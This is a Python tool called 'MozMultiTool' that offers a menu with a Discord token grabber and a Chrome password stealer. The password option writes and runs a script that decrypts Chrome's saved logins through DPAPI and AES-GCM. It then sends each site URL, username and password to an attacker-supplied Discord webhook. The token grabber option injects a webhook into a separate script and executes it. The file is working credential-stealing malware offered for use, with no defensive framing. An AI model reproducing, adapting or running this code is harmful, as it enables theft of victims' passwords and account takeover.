from colorama import Fore, init
from termcolor import colored
import fileinput
import json
import base64
import sqlite3
import shutil
import requests
import re
from requests import get
from pick import pick
from urllib.request import Request, urlopen
from discord_webhook import DiscordWebhook
from datetime import timezone, datetime, timedelta
import win32crypt
from Crypto.Cipher import AES
import os
init()

os.system('title MozMultiTool')

print(Fore.RED)


title = """   __  __          __  __       _ _   _ _____           _ 
  |  \/  | ___ ___|  \/  |_   _| | |_(_)_   _|__   ___ | |
  | |\/| |/ _ \_  / |\/| | | | | | __| | | |/ _ \ / _ \| |
  | |  | | (_) / /| |  | | |_| | | |_| | | | (_) | (_) | |
  |_|  |_|\___/___|_|  |_|\__,_|_|\__|_| |_|\___/ \___/|_|                                                         
"""

options = ['╔═════════════════════╗', '║Discord Token Grabber║', '║Get Passwords        ║', '╚═════════════════════╝']

option, index = pick(options, title, indicator='>', default_index=1)

if index == 1:
    discwebhook1 = input('Discord Webhook: ')
    with fileinput.FileInput('dtg.py', inplace=True, backup='.bak') as file:
        for line in file:
            print(line.replace('YOUR_WEBHOOK_HERE', discwebhook1), end='')
    exec(open("dtg.py").read())
        

if index == 2:
    discwebhook2 = input('Discord Webhook: ')
    bsname = input('File name: ')
    f = open(bsname +'.py', 'a')
    f.write("""webhook_url = """+'"'+discwebhook2+'"'+"""

import os
import json
import base64
import sqlite3
import shutil
import requests
from datetime import timezone, datetime, timedelta
from discord_webhook import DiscordWebhook

#3rd party modules
import win32crypt
from Crypto.Cipher import AES
    
def my_chrome_datetime(time_in_mseconds):
    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

def encryption_key():

    localState_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    #read local state file
    with open(localState_path, "r", encoding="utf-8") as file:
        local_state_file = file.read()
        local_state_file = json.loads(local_state_file)

    # decode the key and remove first 5 DPAPI str characters
    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]

    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decryted key

def decrypt_password(enc_password, key):
    try:

        init_vector = enc_password[3:15]
        enc_password = enc_password[15:]

        # initialize cipher object
        cipher = AES.new(key, AES.MODE_GCM, init_vector)
        # decrypt password
        return cipher.decrypt(enc_password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords(logged in with Social Account)"

def main():

    password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")

    shutil.copyfile(password_db_path,"my_chrome_data.db")

    db = sqlite3.connect("my_chrome_data.db")
    cursor = db.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")

    encp_key = encryption_key()

    for row in cursor.fetchall():
        siteurl = row[0]
        username = row[1]
        password = decrypt_password(row[2], encp_key)
        date_created = row[3]

        if username or password:
            print("Site Login URL:", siteurl)
            print("Username/Email:", username)
            print(f"Password:",password)
        else:
            continue
        if date_created:
            print("Date date_created:", str(my_chrome_datetime(date_created)))
        
    
        webhook1 = DiscordWebhook(url=webhook_url, content='Site login url: '+siteurl)
        webhook2 = DiscordWebhook(url=webhook_url, content='Username/Email:'+username)
        webhook3 = DiscordWebhook(url=webhook_url, content=f"Password:" +password)
        response1 = webhook1.execute()
        response2 = webhook2.execute()
        response3 = webhook3.execute()
   

    cursor.close()
    db.close()

    #remove the copied database after reading passwords
    os.remove("my_chrome_data.db")

if __name__ == "__main__":
    main()
    
""")
    exec(open(bsname+'.py').read())